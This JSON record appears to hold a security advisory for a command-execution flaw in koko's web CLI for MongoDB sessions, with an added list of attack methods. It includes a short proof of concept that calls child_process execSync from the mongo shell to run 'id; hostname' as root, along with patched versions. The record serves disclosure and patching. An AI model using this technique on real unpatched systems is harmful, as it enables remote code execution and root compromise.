{"description": "### Impact\n\nAn authenticated user can exploit a vulnerability in MongoDB sessions to execute arbitrary commands, leading to remote code execution. This vulnerability may further be leveraged to gain root privileges on the host system.\n\n### Details\nThrough the WEB CLI interface provided by koko, a user logs into the authorized mongoDB database and exploits the MongoDB session to execute arbitrary commands.\n\n```\nadmin> const { execSync } = require(\"child_process\")\nadmin> console.log(execSync(\"id; hostname;\").toString())\nuid=0(root) gid=0(root) groups=0(root)\njms_koko\nadmin> \n```\n\n### Patches\nSafe versions: \n- v2.28.20\n- v3.7.1 \n\n### Workarounds\nIt is recommended to upgrade the safe versions.\n\nAfter upgrade, you can use the same method to check whether the vulnerability is fixed.\n```\nadmin> console.log(execSync(\"id; hostname;\").toString())\n/bin/sh: line 1: /bin/hostname: Permission denied\n```\n\n### References\nThanks for **Oskar Zeino-Mahmalat** of [Sonar](https://sonarsource.com/) found and report this vulnerability", "methods": ["Exploited a vulnerability in MongoDB sessions to execute arbitrary commands.", "Executed system commands via the MongoDB shell using the `execSync` function.", "Leveraged the MongoDB shell to execute the `id` and `hostname` commands.", "Demonstrated privilege escalation to root privileges on the host system.", "Used the `child_process` module to execute system commands.", "Executed commands with elevated privileges (uid=0(root)).", "Demonstrated a lack of permission to execute the `hostname` command after patching."]}